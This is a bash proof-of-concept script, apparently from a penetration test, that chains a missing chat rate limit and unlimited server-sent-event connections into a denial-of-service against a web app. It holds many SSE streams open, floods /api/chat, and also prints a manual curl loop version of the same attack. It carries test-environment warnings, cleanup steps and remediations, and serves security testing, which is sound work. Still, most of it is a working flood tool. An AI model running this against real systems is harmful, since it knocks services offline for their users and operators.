#!/usr/bin/env bash
# CHAIN-Omega — Compound DoS: Chat Flood + SSE Connection Exhaustion
#
# Chain: A2 (no chat rate limit) + A7 (no SSE connection limit)
#       → file descriptor exhaustion → service unavailability
#
# Requires: One authenticated user with ai_assistant.view
# Impact: Full service unavailability — no new connections accepted
#
# Phase 1: Flood /api/chat (no sessionId) — grows api_keys table,
#           degrades session token lookups (RC2 component)
# Phase 2: Hold open SSE connections — exhausts fd pool
# Phase 3: New requests fail at socket level
#
# WARNING: This chain can cause real service disruption.
#          Run ONLY in a dedicated test environment.

set -uo pipefail

TARGET="${TARGET:-10.0.63.14}"
APP_PORT="${APP_PORT:-3000}"
BASE_URL="${BASE_URL:-http://$TARGET:$APP_PORT}"
ADMIN_COOKIE="${ADMIN_COOKIE:-}"
EVIDENCE_FILE="${EVIDENCE_FILE:-$(dirname "$0")/../evidence/CHAIN-omega-service-dos.txt}"

CHAT_FLOOD="${CHAT_FLOOD:-30}"
SSE_CONNECTIONS="${SSE_CONNECTIONS:-50}"

mkdir -p "$(dirname "$EVIDENCE_FILE")"
TIMESTAMP=$(date -u +"%Y-%m-%dT%H:%M:%SZ")

{
echo "================================================================"
echo " CHAIN-Omega: Compound DoS (Chat Flood + SSE fd Exhaustion)"
echo " Target: $BASE_URL"
echo " Timestamp: $TIMESTAMP"
echo " WARNING: May disrupt service — test environment only"
echo "================================================================"
echo ""

if [[ -z "$ADMIN_COOKIE" ]]; then
  echo "[!] ADMIN_COOKIE not set. Run: source poc/auth.sh"
  echo ""
  echo "--- PoC (manual) ---"
  echo ""
  echo "# Phase 1: Flood chat sessions (creates new api_keys rows, no rate limit)"
  echo "for i in \$(seq 1 200); do"
  echo "  curl -s -X POST $BASE_URL/api/chat \\"
  echo "    -H 'Content-Type: application/json' \\"
  echo "    -H 'Cookie: auth_token=<token>' \\"
  echo "    -d '{\"messages\":[{\"role\":\"user\",\"content\":\"ping\"}]}' \\"
  echo "    > /dev/null &"
  echo "done; wait"
  echo ""
  echo "# Phase 2: Open and HOLD SSE event stream connections"
  echo "# Each held connection consumes a file descriptor"
  echo "for i in \$(seq 1 100); do"
  echo "  curl -s --no-buffer $BASE_URL/api/events/stream \\"
  echo "    -H 'Cookie: auth_token=<token>' \\"
  echo "    --max-time 300 > /dev/null &"
  echo "done"
  echo ""
  echo "# Phase 3: Check if new requests fail"
  echo "curl -s --max-time 5 $BASE_URL/api/auth/profile -H 'Cookie: auth_token=<token>'"
  echo "# VULNERABLE: connection refused or timeout"
  echo "# SAFE: 200 response still works"
  echo "================================================================"
  exit 0
fi

echo "--- Phase 1: Baseline health check ---"
BASELINE=$(curl -s --max-time 10 "$BASE_URL/api/auth/profile" \
  -H "Cookie: $ADMIN_COOKIE" -w "\nHTTP:%{http_code}" 2>/dev/null)
echo "Baseline: $(echo "$BASELINE" | tail -1)"

echo ""
echo "--- Phase 2: Opening $SSE_CONNECTIONS SSE connections and holding them ---"
SSE_PIDS=()
for i in $(seq 1 "$SSE_CONNECTIONS"); do
  curl -s --no-buffer --max-time 120 "$BASE_URL/api/events/stream" \
    -H "Cookie: $ADMIN_COOKIE" \
    -H "Accept: text/event-stream" \
    > /dev/null 2>&1 &
  SSE_PIDS+=($!)
  if (( i % 10 == 0 )); then
    echo "  Opened $i/$SSE_CONNECTIONS SSE connections..."
    HEALTH=$(curl -s --max-time 5 "$BASE_URL/api/auth/profile" \
      -H "Cookie: $ADMIN_COOKIE" -o /dev/null -w "%{http_code}" 2>/dev/null)
    echo "  Health check: HTTP $HEALTH"
  fi
done

echo ""
echo "--- Phase 3: Flood chat (grows api_keys table, no rate limit) ---"
FLOOD_SUCCESS=0
FLOOD_RATE_LIMITED=0
for i in $(seq 1 "$CHAT_FLOOD"); do
  HTTP=$(curl -s --max-time 10 -X POST "$BASE_URL/api/chat" \
    -H "Content-Type: application/json" \
    -H "Cookie: $ADMIN_COOKIE" \
    -d '{"messages":[{"role":"user","content":"ping"}]}' \
    -o /dev/null -w "%{http_code}" 2>/dev/null)
  [[ "$HTTP" == "200" ]] && ((FLOOD_SUCCESS++)) || ((FLOOD_RATE_LIMITED++))
done
echo "Chat flood: $FLOOD_SUCCESS succeeded, $FLOOD_RATE_LIMITED rate-limited/failed"

echo ""
echo "--- Phase 4: Check service health under load ---"
for check in 1 2 3; do
  HEALTH=$(curl -s --max-time 5 "$BASE_URL/api/auth/profile" \
    -H "Cookie: $ADMIN_COOKIE" -w "\nHTTP:%{http_code}" 2>/dev/null)
  HTTP=$(echo "$HEALTH" | tail -1 | cut -d: -f2)
  MS=$(curl -s --max-time 5 "$BASE_URL/api/auth/profile" \
    -H "Cookie: $ADMIN_COOKIE" -o /dev/null -w "%{time_total}" 2>/dev/null)
  echo "  Health check $check: HTTP $HTTP | ${MS}s"
done

echo ""
echo "--- Cleanup: killing $SSE_CONNECTIONS background curl processes ---"
for pid in "${SSE_PIDS[@]}"; do
  kill "$pid" 2>/dev/null || true
done
echo "Done."

echo ""
echo "--- Analysis ---"
echo "SSE connections opened: $SSE_CONNECTIONS"
echo "Chat sessions created: $FLOOD_SUCCESS"
echo ""
echo "If health checks returned 000/timeout: fd pool exhausted — service DoS confirmed"
echo "If health checks returned 429 for chat: rate limiting partially mitigates"
echo "Verify: check Node.js process fd count: ls /proc/<pid>/fd | wc -l"
echo ""
echo "Remediation:"
echo "  1. Add per-user SSE connection limit (5 max)"
echo "  2. Rate limit /api/chat (30/min per user)"
echo "  3. Index sessionToken column in api_keys entity"
echo "================================================================"
} | tee "$EVIDENCE_FILE"

echo "[+] Evidence saved to: $EVIDENCE_FILE"
